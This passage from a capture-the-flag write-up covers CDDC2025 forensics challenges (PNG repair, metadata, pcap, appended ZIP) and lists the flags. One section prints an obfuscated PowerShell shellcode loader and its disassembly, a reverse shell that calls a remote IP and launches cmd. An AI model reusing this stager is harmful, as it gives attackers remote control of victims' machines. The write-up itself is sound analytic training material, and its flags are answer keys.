00000060: 0003 1062 82f8 43d9 6bad bdb7 5be4 f99e  ...b..C.k...[...
00000070: e472 7998 9b9b 999b 37e1 feb3 e56b 7ff8  .ry.....7....k..
00000080: a70f 977f ddbb 2aa7 9ff7 af7d e1c3 e52f  ......*....}.../
00000090: 1f30 fff9 c3f9 2f7b 57b6 1c3f 2fb5 ec29  .0..../{W..?/..)
```

Looking at the first few bytes, avalid PNG should start with
`89 50 4E 47 0D 0A 1A 0A`, so we use hex editor to fix the header.

Afterwards, we run `pngcheck chall.png` which tells us:

```bash
$ pngcheck chall.png

chall.png  first chunk must be IHDR
ERROR: chall.png
```

so we change to `00 00 00 0D 49 48 44 52`.

The following are further problems detected and being fixed:

```text
chall.png  illegal (unless recently approved) unknown, public chunk ICAT
ERROR: chall.png
chall.png  illegal (unless recently approved) unknown, public chunk AEND
ERROR: chall.png
```

After fixing it, we obtained the flag in the fixed png image.

The flag is: `CDDC2025{call_an_ambulance_but_not_for_me}`

### C3rt1f1cAt3

I hide in files but not in sight,  
Revealing secrets when viewed right.  
Inspect me close and you will see,  
Hidden details inside of me.  
What am I?  

Answering the riddle with `metadata` gives us an image `cert1.png`.

The answer to the riddle gives us clue that we should look into metadata of the image. We can do so by running `exiftool` on the image:

```bash
$ exiftool -a cert1.png

ExifTool Version Number         : 12.40
File Name                       : cert1.png
Directory                       : .
File Size                       : 436 KiB
File Modification Date/Time     : 2025:05:11 23:03:59+08:00
File Access Date/Time           : 2025:05:11 23:04:17+08:00
File Inode Change Date/Time     : 2025:05:11 23:04:13+08:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 734
Image Height                    : 517
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 3780
Pixels Per Unit Y               : 3780
Pixel Units                     : meters
XMP Toolkit                     : Image::ExifTool 13.00
Certificate                     : Q0REQzIwMjV7SU5DRVJUUEFZTE9BRH0=
Image Size                      : 734x517
Megapixels                      : 0.379
```

Deoding the base64 string in `Certificate` attribute gives us the flag.

The flag is: `CDDC2025{INCERTPAYLOAD}`

### SERVER_LOCATION

server says hello!  
What is the name of the world's most popular network protocol analyzer!?  
If you have found Server Location which is a city that would be the flag!  

flag is all in lowercase and X space

Answering the riddle with `wireshark` gives us a file `networkorea.pcapng`.  

We analyze the packets in there and found a packet using TLSv1.2 protocol containing "Server Hello" as info. We took the ip address of this packet and search online, we found that the city is Seoul.

The flag is: `CDDC2025{seoul}`

### THE_CITY

The CITY's MAGIC Number  
Identify the correct Magic number to unlock the fix.  

Answering the riddle with `89504E470D0A1A0A` which is the png signature, gives us a zip file `how2fix.zip`. Attempting to unzip it failed or resulted in errors. Running `xxd` and `binwalk` suggested that the file might be more than just a ZIP archive.

We first examine the zip file using `exiftool` and we found that there is file format error. We checked the hex of the file using `xxd` and we realized that the IHDR chunk at the beginning suggests that this is actually a PNG file. After fixing the image and we run `binwalk` on it, we found that the file was a valid PNG with a ZIP archive appended to it.

Then, I searched for the IEND PNG chunk to determine where the image ends. Once I located the end of the PNG, I could deduce that everything after that is likely ZIP data. Similarly, the header of the zip file needs to be fixed. After fixing all these, we are able to extract the hidden data and find the flag in `FIRST_TRY.txt`:

```bash
$ binwalk -e how2fix.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 923 x 552, 8-bit/color RGB, non-interlaced
62            0x3E            Zlib compressed data, default compression
135652        0x211E4         Zip archive data, at least v2.0 to extract, compressed size: 839, uncompressed size: 3859, name: FIRST_TRY.txt
136629        0x215B5         End of Zip archive, footer length: 22

$ cd _how2fix.png.extracted/
$ cat FIRST_TRY.txt | grep "CDDC2025"

CDDC2025{HOWTOUSEFORENSI88C88}
```

The flag is: `CDDC2025{HOWTOUSEFORENSI88C88}`

### dimensional

You received another PNG file.  
After checking the headers, everything seemed fine.  
"I don’t see anything wrong," you said.  

Star smirked.  
"Really? Have you considered what’s off in the image?"  

We run `pngcheck` and we found that there is error in the image and we need to fix it.

```bash
$ pngcheck -v chall.png

File: chall.png (944828 bytes)
  chunk IHDR at offset 0x0000c, length 13
    16 x 16 image, 24-bit RGB, non-interlaced
  CRC error in chunk IHDR (computed 90916836, expected 198a49b3)
ERRORS DETECTED in chall.png
```

So we use a script to fix this image to obtain the flag from the fixed image:

```bash
$ wget "https://raw.githubusercontent.com/cjharris18/png-dimensions-bruteforcer/main/png_dimensions_bruteforce.py"
$ chmod +x ./png_dimensions_bruteforce.py
$ ./png_dimensions_bruteforce.py -f chall.png -v -o chall_fixed.png

===================================================
    **    PNG Image Dimension Bruteforcer    **
               Created by cjharris18
===================================================

[+] Found Correct Dimensions...
Width: 1396
Height: 762

Remember to pad this with leading 0's as required.

Successfully wrote to: chall_fixed.png
```

The flag is: `CDDC2025{dimensional_manipulation}`

### IPIntheScript

We are given a script and asked to extract the ipaddress and port from this script. We converted this script from base64 using [online decoder](https://www.base64decode.org/) and we get:

```powershell
if ([IntPtr]::Size -eq 4) {
    $b='powershell.exe'
} else {
    $b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
};

$s = New-Object System.Diagnostics.ProcessStartInfo;
$s.FileName=$b;
$s.Arguments='-nop -w hidden -c &(
    [scriptblock]::create(
        (New-Object System.IO.StreamReader(
            New-Object System.IO.Compression.GzipStream(
                (New-Object System.IO.MemoryStream(
                    ,[System.Convert]::FromBase64String(
                        (
                            (H4sIAAa{1}/GcCA7VW+2/aSBD+vVL/B6tCsi0RXqFJE6nS2Tx{0}MAEcTICi08Ze2xsWL1''+''2vebX9329scB6XpMqd1JUQ9uzM7Ow338zYi0{0}H''+''EBZK7lr68fGDdFx9x{0}FSUnKLXl7KfdfUx50cuQ2lr5Iy01arOlsiEs4vL2sx5z{1}Uh/dCCwstivDyjhIcKar0UxoHmOOT67t77Ajph5T7u9Ci7A7Ro9quhpwASyda''+''6CZ7Xea{1}JKaCtaJEKPK3b7I6OynPC43vMaKRIlu7SOBlwaVUVqVfanL{1}zW6FFdkkDmcR80RhTMLTSmEURsjDPfC2xiYWAXMjGe7yeBuORczD9FKJl4OOIs{0}jnz{0}Hc12Oo0jOS7PE/2w+/0uZHQ8fxqE{1}S1wwQoE5W1mYr4mDo0IbhS7FQ+z{0}wcoSnIT+XFVBbc0WWMmFMaV''+''56b+4UXp4k0H3XiPlq''+''RFo9QVX85DOl9c0mRtTfDCUX4kTGKDCOrAAoPuVoOdlpPHdV0jzKMjWL{0}3BEKzSZxFJTb9KpbxkwrlIML6D19w{0}j7E6f4AakrLXyCr/XnflzBYs919Mawyymc2IO3/08Cz3uUh4516i9TaV69{1}jIa7vQrQkTsZW5bWUYI/iFJRCptaDGBX5uIHdOqbYRyJBOWHGC7PGko{1}HWz0m1MVccyCtEUQFGVefB3{0}InCIboYmX{1}ODhHaia86BGcKZ9rItddnryDkpyjaIoykv9GI''+''rUyUsWRhS7eUkLI3Lc0mLB0kf5MVwzpoI4KBKZu7n6bzyP59Z''+''YGAkeO5BcwODGWmGHIJpAkpfaxMX6ziJ+dr78KiA1RClUD3haQ0JAk{1}BhiYQyHEI90EMtWF{1}YyxXFS1BK20aTIh+axLFIUpIhH7vyW6Fm1XC{1}f{1}JOhsqTQCHjFmUiL9mEC+hCCdApy/5fIC870CGiGsfHJClZsc30nUjqIRecfXabCV2PUKXAcAG{1}{0}Dlb6ijC''+''Z9VDw1E+Fa9JTYM1MUJqOvqClLU{0}KRsm/Ebk1GD1c/eqc98u8vo28DQjMsx''+''2vz5ot6vrjmVXhdUwxFXfEG''+''bj9v7e0trD0URMDa19Q0qLSXW/6pC91dXcybZ4ttf3m5K+3d/7rjepe55/7lnD8ucm6Y5rA71UQd16I+6O9Y1eqkY{0}smkPyGiw6DTF3cSmaOQV/dvyBSLbLr+3y8zc''+''G5rWCk6dfcezW4Hp7ibt4sW4utA''+''amlYLG3ZTZ1cTnWv9oj1q6o{0}RQx8''+''MQHbmF70qyGiF{0}ZFZYy1vxTRfG06r4RIF+tiukOnqdhiAryaEYBZLVcPFW/alOyb2umijVk9MtVqnWnZv7X27{1}oLO1I67F9PIbXTqG12blBsdvd7SGsPRqDkd24vp+IZOx6PylGFnUwzAB8H6tb24K5ot3wi2ZR/OOk/9''+''L8mS3lXc4sXoix5urvz+2ncH4/Phtre7qzBtVCzanyDbsxEJxWllnlvzpDt+/JDzbp+k+62mbyIeBY{1}CDaCdZ3XZZLx5b{0}J9RhILRYEJ''+''v8A8xBQGI4zOjMkapcxJp{1}M0c5hLh2mRDK+''+''RkYbz2pMqPSiqj0MjE11eTiFCKIyUsYUuDn0R5Evb01IJen5pW6qmFfD+i9XYaqccvOWTsQHAPHinqXdwSDxJUf40WPBVIKA9vQXXW8jBuQvoJ{0}DcDqWd4KczRp+il17q{1}QPPoAPMynDtWfI5AOwA8xP''+''8XcqJZGA+HcC56Kwz+JOUObanAP7c31PmUfab3XfRqJRPkHkhfC540tv/2OXHiAjQs6DBUnyY/q9hcK''+''yQJ4l{0}s{1}L0944r+SC+jsVJDz6x0h7/D7B{0}VdeECwA''+''A'')
                            -f''N'',''g''
                        )
                    )
                )
            ),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';

$s.UseShellExecute=$false;
$s.RedirectStandardOutput=$true;
$s.WindowStyle='Hidden';
$s.CreateNoWindow=$true;
$p=[System.Diagnostics.Process]::Start($s);



$base64 = "(''H4sIAAa{1}/GcCA7VW+2/aSBD+vVL/B6tCsi0RXqFJE6nS2Tx{0}MAEcTICi08Ze2xsWL1''+''2vebX9329scB6XpMqd1JUQ9uzM7Ow338zYi0{0}H''+''EBZK7lr68fGDdFx9x{0}FSUnKLXl7KfdfUx50cuQ2lr5Iy01arOlsiEs4vL2sx5z{1}Uh/dCCwstivDyjhIcKar0UxoHmOOT67t77Ajph5T7u9Ci7A7Ro9quhpwASyda''+''6CZ7Xea{1}JKaCtaJEKPK3b7I6OynPC43vMaKRIlu7SOBlwaVUVqVfanL{1}zW6FFdkkDmcR80RhTMLTSmEURsjDPfC2xiYWAXMjGe7yeBuORczD9FKJl4OOIs{0}jnz{0}Hc12Oo0jOS7PE/2w+/0uZHQ8fxqE{1}S1wwQoE5W1mYr4mDo0IbhS7FQ+z{0}wcoSnIT+XFVBbc0WWMmFMaV''+''56b+4UXp4k0H3XiPlq''+''RFo9QVX85DOl9c0mRtTfDCUX4kTGKDCOrAAoPuVoOdlpPHdV0jzKMjWL{0}3BEKzSZxFJTb9KpbxkwrlIML6D19w{0}j7E6f4AakrLXyCr/XnflzBYs919Mawyymc2IO3/08Cz3uUh4516i9TaV69{1}jIa7vQrQkTsZW5bWUYI/iFJRCptaDGBX5uIHdOqbYRyJBOWHGC7PGko{1}HWz0m1MVccyCtEUQFGVefB3{0}InCIboYmX{1}ODhHaia86BGcKZ9rItddnryDkpyjaIoykv9GI''+''rUyUsWRhS7eUkLI3Lc0mLB0kf5MVwzpoI4KBKZu7n6bzyP59Z''+''YGAkeO5BcwODGWmGHIJpAkpfaxMX6ziJ+dr78KiA1RClUD3haQ0JAk{1}BhiYQyHEI90EMtWF{1}YyxXFS1BK20aTIh+axLFIUpIhH7vyW6Fm1XC{1}f{1}JOhsqTQCHjFmUiL9mEC+hCCdApy/5fIC870CGiGsfHJClZsc30nUjqIRecfXabCV2PUKXAcAG{1}{0}Dlb6ijC''+''Z9VDw1E+Fa9JTYM1MUJqOvqClLU{0}KRsm/Ebk1GD1c/eqc98u8vo28DQjMsx''+''2vz5ot6vrjmVXhdUwxFXfEG''+''bj9v7e0trD0URMDa19Q0qLSXW/6pC91dXcybZ4ttf3m5K+3d/7rjepe55/7lnD8ucm6Y5rA71UQd16I+6O9Y1eqkY{0}smkPyGiw6DTF3cSmaOQV/dvyBSLbLr+3y8zc''+''G5rWCk6dfcezW4Hp7ibt4sW4utA''+''amlYLG3ZTZ1cTnWv9oj1q6o{0}RQx8''+''MQHbmF70qyGiF{0}ZFZYy1vxTRfG06r4RIF+tiukOnqdhiAryaEYBZLVcPFW/alOyb2umijVk9MtVqnWnZv7X27{1}oLO1I67F9PIbXTqG12blBsdvd7SGsPRqDkd24vp+IZOx6PylGFnUwzAB8H6tb24K5ot3wi2ZR/OOk/9''+''L8mS3lXc4sXoix5urvz+2ncH4/Phtre7qzBtVCzanyDbsxEJxWllnlvzpDt+/JDzbp+k+62mbyIeBY{1}CDaCdZ3XZZLx5b{0}J9RhILRYEJ''+''v8A8xBQGI4zOjMkapcxJp{1}M0c5hLh2mRDK+''+''RkYbz2pMqPSiqj0MjE11eTiFCKIyUsYUuDn0R5Evb01IJen5pW6qmFfD+i9XYaqccvOWTsQHAPHinqXdwSDxJUf40WPBVIKA9vQXXW8jBuQvoJ{0}DcDqWd4KczRp+il17q{1}QPPoAPMynDtWfI5AOwA8xP''+''8XcqJZGA+HcC56Kwz+JOUObanAP7c31PmUfab3XfRqJRPkHkhfC540tv/2OXHiAjQs6DBUnyY/q9hcK''+''yQJ4l{0}s{1}L0944r+SC+jsVJDz6x0h7/D7B{0}VdeECwA''+''A'')-f''N'',''g''"
$bytes = [System.Convert]::FromBase64String($base64)
[System.Text.Encoding]::UTF8.GetString($bytes)
```

After removing `''+''` and replacing `{0}` and `{1}` with `N` and `g` respectively, we get a clean base64 code to decode and decompress with gzip:

```text
H4sIAAag/GcCA7VW+2/aSBD+vVL/B6tCsi0RXqFJE6nS2TxNMAEcTICi08Ze2xsWL12vebX9329scB6XpMqd1JUQ9uzM7Ow338zYi0NHEBZK7lr68fGDdFx9xNFSUnKLXl7KfdfUx50cuQ2lr5Iy01arOlsiEs4vL2sx5zgUh/dCCwstivDyjhIcKar0UxoHmOOT67t77Ajph5T7u9Ci7A7Ro9quhpwASyda6CZ7XeagJKaCtaJEKPK3b7I6OynPC43vMaKRIlu7SOBlwaVUVqVfanLgzW6FFdkkDmcR80RhTMLTSmEURsjDPfC2xiYWAXMjGe7yeBuORczD9FKJl4OOIsNjnzNHc12Oo0jOS7PE/2w+/0uZHQ8fxqEgS1wwQoE5W1mYr4mDo0IbhS7FQ+zNwcoSnIT+XFVBbc0WWMmFMaV56b+4UXp4k0H3XiPlqRFo9QVX85DOl9c0mRtTfDCUX4kTGKDCOrAAoPuVoOdlpPHdV0jzKMjWLN3BEKzSZxFJTb9KpbxkwrlIML6D19wNj7E6f4AakrLXyCr/XnflzBYs919Mawyymc2IO3/08Cz3uUh4516i9TaV69gjIa7vQrQkTsZW5bWUYI/iFJRCptaDGBX5uIHdOqbYRyJBOWHGC7PGkogHWz0m1MVccyCtEUQFGVefB3NInCIboYmXgODhHaia86BGcKZ9rItddnryDkpyjaIoykv9GIrUyUsWRhS7eUkLI3Lc0mLB0kf5MVwzpoI4KBKZu7n6bzyP59ZYGAkeO5BcwODGWmGHIJpAkpfaxMX6ziJ+dr78KiA1RClUD3haQ0JAkgBhiYQyHEI90EMtWFgYyxXFS1BK20aTIh+axLFIUpIhH7vyW6Fm1XCgfgJOhsqTQCHjFmUiL9mEC+hCCdApy/5fIC870CGiGsfHJClZsc30nUjqIRecfXabCV2PUKXAcAGgNDlb6ijCZ9VDw1E+Fa9JTYM1MUJqOvqClLUNKRsm/Ebk1GD1c/eqc98u8vo28DQjMsx2vz5ot6vrjmVXhdUwxFXfEGbj9v7e0trD0URMDa19Q0qLSXW/6pC91dXcybZ4ttf3m5K+3d/7rjepe55/7lnD8ucm6Y5rA71UQd16I+6O9Y1eqkYNsmkPyGiw6DTF3cSmaOQV/dvyBSLbLr+3y8zcG5rWCk6dfcezW4Hp7ibt4sW4utAamlYLG3ZTZ1cTnWv9oj1q6oNRQx8MQHbmF70qyGiFNZFZYy1vxTRfG06r4RIF+tiukOnqdhiAryaEYBZLVcPFW/alOyb2umijVk9MtVqnWnZv7X27goLO1I67F9PIbXTqG12blBsdvd7SGsPRqDkd24vp+IZOx6PylGFnUwzAB8H6tb24K5ot3wi2ZR/OOk/9L8mS3lXc4sXoix5urvz+2ncH4/Phtre7qzBtVCzanyDbsxEJxWllnlvzpDt+/JDzbp+k+62mbyIeBYgCDaCdZ3XZZLx5bNJ9RhILRYEJv8A8xBQGI4zOjMkapcxJpgM0c5hLh2mRDK+RkYbz2pMqPSiqj0MjE11eTiFCKIyUsYUuDn0R5Evb01IJen5pW6qmFfD+i9XYaqccvOWTsQHAPHinqXdwSDxJUf40WPBVIKA9vQXXW8jBuQvoJNDcDqWd4KczRp+il17qgQPPoAPMynDtWfI5AOwA8xP8XcqJZGA+HcC56Kwz+JOUObanAP7c31PmUfab3XfRqJRPkHkhfC540tv/2OXHiAjQs6DBUnyY/q9hcKyQJ4lNsgL0944r+SC+jsVJDz6x0h7/D7BNVdeECwAA
```

And we parse into Cyberchef to decode and decompress we get:

```powershell
function dv {
        Param ($kN, $qA)
        $iXn = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $iXn.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($iXn.GetMethod('GetModuleHandle')).Invoke($null, @($kN)))), $qA))
}

function gd {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $izAip,
                [Parameter(Position = 1)] [Type] $z8MSW = [Void]
        )

        $stf7f = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $stf7f.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $izAip).SetImplementationFlags('Runtime, Managed')
        $stf7f.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $z8MSW, $izAip).SetImplementationFlags('Runtime, Managed')

        return $stf7f.CreateType()
}

[Byte[]]$h65dF = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VUFBQUEBQQFBo6g/f4P/Vl2oFaMCoGfpoAgARZ4nmahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VaGNtZACJ41dXVzH2ahJZVuL9ZsdEJDwBAY1EJBDGAERUUFZWVkZWTlZWU1Zoecw/hv/VieBOVkb/MGgIhx1g/9W78LWiVmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
[Uint32]$vr = 0
$fX = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dv kernel32.dll VirtualAlloc), (gd @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $h65dF.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($h65dF, 0, $fX, $h65dF.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dv kernel32.dll VirtualProtect), (gd @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($fX, [Uint32]$h65dF.Length, 0x10, [Ref]$vr)) -eq $true) {
        $s6JQ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dv kernel32.dll CreateThread), (gd @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$fX,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dv kernel32.dll WaitForSingleObject), (gd @([IntPtr], [Int32]))).Invoke($s6JQ,0xffffffff) | Out-Null
}

```

We found another base64 string which likely contains information about the ipaddress and port.

```text
/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/
rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/
6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/
gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VUFBQUEBQQFBo6g/f4P/
Vl2oFaMCoGfpoAgARZ4nmahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/
VaGNtZACJ41dXVzH2ahJZVuL9ZsdEJDwBAY1EJBDGAERUUFZWVkZWTlZWU1Zoecw/hv/
VieBOVkb/MGgIhx1g/9W78LWiVmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V
```

After converting to raw hex form and put into an [online disassmbler](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=fc+e8+82+00+00+00+60+89+e5+31+c0+64+8b+50+30+8b+52+0c+8b+52+14+8b+72+28+0f+b7+4a+26+31+ff+ac+3c+61+7c+02+2c+20+c1+cf+0d+01+c7+e2+f2+52+57+8b+52+10+8b+4a+3c+8b+4c+11+78+e3+48+01+d1+51+8b+59+20+01+d3+8b+49+18+e3+3a+49+8b+34+8b+01+d6+31+ff+ac+c1+cf+0d+01+c7+38+e0+75+f6+03+7d+f8+3b+7d+24+75+e4+58+8b+58+24+01+d3+66+8b+0c+4b+8b+58+1c+01+d3+8b+04+8b+01+d0+89+44+24+24+5b+5b+61+59+5a+51+ff+e0+5f+5f+5a+8b+12+eb+8d+5d+68+33+32+00+00+68+77+73+32+5f+54+68+4c+77+26+07+ff+d5+b8+90+01+00+00+29+c4+54+50+68+29+80+6b+00+ff+d5+50+50+50+50+40+50+40+50+68+ea+0f+df+e0+ff+d5+97+6a+05+68+c0+a8+19+fa+68+02+00+11+67+89+e6+6a+10+56+57+68+99+a5+74+61+ff+d5+85+c0+74+0c+ff+4e+08+75+ec+68+f0+b5+a2+56+ff+d5+68+63+6d+64+00+89+e3+57+57+57+31+f6+6a+12+59+56+e2+fd+66+c7+44+24+3c+01+01+8d+44+24+10+c6+00+44+54+50+56+56+56+46+56+4e+56+56+53+56+68+79+cc+3f+86+ff+d5+89+e0+4e+56+46+ff+30+68+08+87+1d+60+ff+d5+bb+f0+b5+a2+56+68+a6+95+bd+9d+ff+d5+3c+06+7c+0a+80+fb+e0+75+05+bb+47+13+72+6f+6a+00+53+ff+d5&arch=x86-32&endianness=little&baddr=0x00000000&dis_with_addr=True&dis_with_raw=True&dis_with_ins=True#disassembly), we obtain some assembly code:

```text
x86 (32)
Little Endian
0x00000000 Base addr
Addresses  Bytescodes  Instructions

0x0000000000000000:  FC                      cld    
0x0000000000000001:  E8 82 00 00 00          call   0x88
0x0000000000000006:  60                      pushal 
0x0000000000000007:  89 E5                   mov    ebp, esp
0x0000000000000009:  31 C0                   xor    eax, eax
0x000000000000000b:  64 8B 50 30             mov    edx, dword ptr fs:[eax + 0x30]
0x000000000000000f:  8B 52 0C                mov    edx, dword ptr [edx + 0xc]
0x0000000000000012:  8B 52 14                mov    edx, dword ptr [edx + 0x14]
0x0000000000000015:  8B 72 28                mov    esi, dword ptr [edx + 0x28]
0x0000000000000018:  0F B7 4A 26             movzx  ecx, word ptr [edx + 0x26]
0x000000000000001c:  31 FF                   xor    edi, edi
0x000000000000001e:  AC                      lodsb  al, byte ptr [esi]
0x000000000000001f:  3C 61                   cmp    al, 0x61
0x0000000000000021:  7C 02                   jl     0x25
0x0000000000000023:  2C 20                   sub    al, 0x20
0x0000000000000025:  C1 CF 0D                ror    edi, 0xd
0x0000000000000028:  01 C7                   add    edi, eax
0x000000000000002a:  E2 F2                   loop   0x1e
0x000000000000002c:  52                      push   edx
0x000000000000002d:  57                      push   edi
0x000000000000002e:  8B 52 10                mov    edx, dword ptr [edx + 0x10]
0x0000000000000031:  8B 4A 3C                mov    ecx, dword ptr [edx + 0x3c]
0x0000000000000034:  8B 4C 11 78             mov    ecx, dword ptr [ecx + edx + 0x78]
0x0000000000000038:  E3 48                   jecxz  0x82
0x000000000000003a:  01 D1                   add    ecx, edx
0x000000000000003c:  51                      push   ecx
0x000000000000003d:  8B 59 20                mov    ebx, dword ptr [ecx + 0x20]
0x0000000000000040:  01 D3                   add    ebx, edx
0x0000000000000042:  8B 49 18                mov    ecx, dword ptr [ecx + 0x18]
0x0000000000000045:  E3 3A                   jecxz  0x81
0x0000000000000047:  49                      dec    ecx
0x0000000000000048:  8B 34 8B                mov    esi, dword ptr [ebx + ecx*4]
0x000000000000004b:  01 D6                   add    esi, edx
0x000000000000004d:  31 FF                   xor    edi, edi
0x000000000000004f:  AC                      lodsb  al, byte ptr [esi]
0x0000000000000050:  C1 CF 0D                ror    edi, 0xd
0x0000000000000053:  01 C7                   add    edi, eax
0x0000000000000055:  38 E0                   cmp    al, ah
0x0000000000000057:  75 F6                   jne    0x4f
0x0000000000000059:  03 7D F8                add    edi, dword ptr [ebp - 8]
0x000000000000005c:  3B 7D 24                cmp    edi, dword ptr [ebp + 0x24]
0x000000000000005f:  75 E4                   jne    0x45
0x0000000000000061:  58                      pop    eax
0x0000000000000062:  8B 58 24                mov    ebx, dword ptr [eax + 0x24]
0x0000000000000065:  01 D3                   add    ebx, edx
0x0000000000000067:  66 8B 0C 4B             mov    cx, word ptr [ebx + ecx*2]
0x000000000000006b:  8B 58 1C                mov    ebx, dword ptr [eax + 0x1c]
0x000000000000006e:  01 D3                   add    ebx, edx
0x0000000000000070:  8B 04 8B                mov    eax, dword ptr [ebx + ecx*4]
0x0000000000000073:  01 D0                   add    eax, edx
0x0000000000000075:  89 44 24 24             mov    dword ptr [esp + 0x24], eax
0x0000000000000079:  5B                      pop    ebx
0x000000000000007a:  5B                      pop    ebx
0x000000000000007b:  61                      popal  
0x000000000000007c:  59                      pop    ecx
0x000000000000007d:  5A                      pop    edx
0x000000000000007e:  51                      push   ecx
0x000000000000007f:  FF E0                   jmp    eax
0x0000000000000081:  5F                      pop    edi
0x0000000000000082:  5F                      pop    edi
0x0000000000000083:  5A                      pop    edx
0x0000000000000084:  8B 12                   mov    edx, dword ptr [edx]
0x0000000000000086:  EB 8D                   jmp    0x15
0x0000000000000088:  5D                      pop    ebp
0x0000000000000089:  68 33 32 00 00          push   0x3233
0x000000000000008e:  68 77 73 32 5F          push   0x5f327377
0x0000000000000093:  54                      push   esp
0x0000000000000094:  68 4C 77 26 07          push   0x726774c
0x0000000000000099:  FF D5                   call   ebp
0x000000000000009b:  B8 90 01 00 00          mov    eax, 0x190
0x00000000000000a0:  29 C4                   sub    esp, eax
0x00000000000000a2:  54                      push   esp
0x00000000000000a3:  50                      push   eax
0x00000000000000a4:  68 29 80 6B 00          push   0x6b8029
0x00000000000000a9:  FF D5                   call   ebp
0x00000000000000ab:  50                      push   eax
0x00000000000000ac:  50                      push   eax
0x00000000000000ad:  50                      push   eax
0x00000000000000ae:  50                      push   eax
0x00000000000000af:  40                      inc    eax
0x00000000000000b0:  50                      push   eax
0x00000000000000b1:  40                      inc    eax
0x00000000000000b2:  50                      push   eax
0x00000000000000b3:  68 EA 0F DF E0          push   0xe0df0fea
0x00000000000000b8:  FF D5                   call   ebp
0x00000000000000ba:  97                      xchg   eax, edi
0x00000000000000bb:  6A 05                   push   5
0x00000000000000bd:  68 C0 A8 19 FA          push   0xfa19a8c0
0x00000000000000c2:  68 02 00 11 67          push   0x67110002
0x00000000000000c7:  89 E6                   mov    esi, esp
0x00000000000000c9:  6A 10                   push   0x10
0x00000000000000cb:  56                      push   esi
0x00000000000000cc:  57                      push   edi
0x00000000000000cd:  68 99 A5 74 61          push   0x6174a599
0x00000000000000d2:  FF D5                   call   ebp
0x00000000000000d4:  85 C0                   test   eax, eax
0x00000000000000d6:  74 0C                   je     0xe4
0x00000000000000d8:  FF 4E 08                dec    dword ptr [esi + 8]
0x00000000000000db:  75 EC                   jne    0xc9
0x00000000000000dd:  68 F0 B5 A2 56          push   0x56a2b5f0
0x00000000000000e2:  FF D5                   call   ebp
0x00000000000000e4:  68 63 6D 64 00          push   0x646d63
0x00000000000000e9:  89 E3                   mov    ebx, esp
0x00000000000000eb:  57                      push   edi
0x00000000000000ec:  57                      push   edi
0x00000000000000ed:  57                      push   edi
0x00000000000000ee:  31 F6                   xor    esi, esi
0x00000000000000f0:  6A 12                   push   0x12
0x00000000000000f2:  59                      pop    ecx
0x00000000000000f3:  56                      push   esi
0x00000000000000f4:  E2 FD                   loop   0xf3
0x00000000000000f6:  66 C7 44 24 3C 01 01    mov    word ptr [esp + 0x3c], 0x101
0x00000000000000fd:  8D 44 24 10             lea    eax, [esp + 0x10]
0x0000000000000101:  C6 00 44                mov    byte ptr [eax], 0x44
0x0000000000000104:  54                      push   esp
0x0000000000000105:  50                      push   eax
0x0000000000000106:  56                      push   esi
0x0000000000000107:  56                      push   esi
0x0000000000000108:  56                      push   esi
0x0000000000000109:  46                      inc    esi
0x000000000000010a:  56                      push   esi
0x000000000000010b:  4E                      dec    esi
0x000000000000010c:  56                      push   esi
0x000000000000010d:  56                      push   esi
0x000000000000010e:  53                      push   ebx
0x000000000000010f:  56                      push   esi
0x0000000000000110:  68 79 CC 3F 86          push   0x863fcc79
0x0000000000000115:  FF D5                   call   ebp
